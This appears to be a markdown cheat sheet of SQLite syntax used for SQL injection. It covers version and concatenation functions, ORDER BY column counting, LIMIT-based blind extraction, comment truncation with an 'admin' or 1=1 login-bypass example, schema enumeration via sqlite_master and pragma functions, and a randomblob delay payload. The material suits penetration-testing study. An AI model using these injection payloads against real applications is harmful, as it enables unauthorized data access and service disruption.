## SQLite engine

* #### Database version
You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
* ```sqlite_version()```
```
#example
select sqlite_version()
```

* #### String concatenation
You can concatenate together multiple strings to make a single string.
* ```||```
* ```CONCAT('Hello', ' ', 'World')```
```
#example
SELECT 'Hello' || ' ' || 'World';
SELECT CONCAT('Hello', ' ', 'World');
```

* #### Substring
You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ```e```.
* ```substr('Hello World',2,1)```
```
#example
select substr(name,2,1) from demo;
```
* ### Finding the number of columns
ORDER BY is essential in SQL injection to determine the number of columns in a vulnerable query. It helps identify injectable columns for UNION SELECT attacks and can be combined with boolean or time-based techniques to extract data. This makes it a key step in structuring successful SQLi exploitation
```
#example
#Original Query
select id,name,role from users

#Identify number of columns
select id,name,role from users order by 3 -- the database engine will run it correctly, because the number of columns in the original query is 3 id, name and role

select id,name,role from users order by 4 -- the database engine will return an error, because there is not a column #4, this tell us that the original query is returning only 3 columns
```

* ### Extracts an specific row
For Blind SQL injection we have to ensures that only the first or a specific row of a query result is returned, making it useful for blind SQLi when extracting data character by character.
* ```LIMIT 1,1```
```
#example
select username from users LIMIT 1,1; -- Returns the second user
```

* #### Length
You can extract the string length, this command allow to know the length for a specific row, Note that you need to combinate it with ```order by``` or ```Limit``` command for Blind SQL injection
* ```LENGTH('hello world')```
```
#example
select LENGTH(name) from demo;
```

* #### Comments
You can use comments to truncate a query and remove the portion of the original query that follows your input.
* ```--```
* ```/* comment */```
```
#example
select username from users where username='admin' or 1=1 -- {this will be ignored}' and password='s3cr3t';
```

* #### Database list
You can list the database that exist in the sqlite server.
```
#example
#Count databases
SELECT count(name) FROM pragma_database_list;

#Recover databases name
SELECT name FROM pragma_database_list;
```

* #### Database contents
You can list the tables that exist in the database, and the columns that those tables contain.
```
#example
#Count tables
SELECT count(name) FROM sqlite_master WHERE type = 'table';

#Recover tables name
SELECT name FROM sqlite_master WHERE type = 'table';

#Count columns from table 'demo'
SELECT count(name) FROM pragma_table_info('demo');

#Recover columns from table 'demo'
SELECT name FROM pragma_table_info('demo');
```


* #### Time delays
You can cause a time delay in the database when the query is processed. This can slow down execution by generating a large random blob (it may crash SQLite)
```
SELECT length(randomblob(900000000));
```

* #### Conditional time delays
You can test a single boolean condition and trigger a time delay if the condition is true.






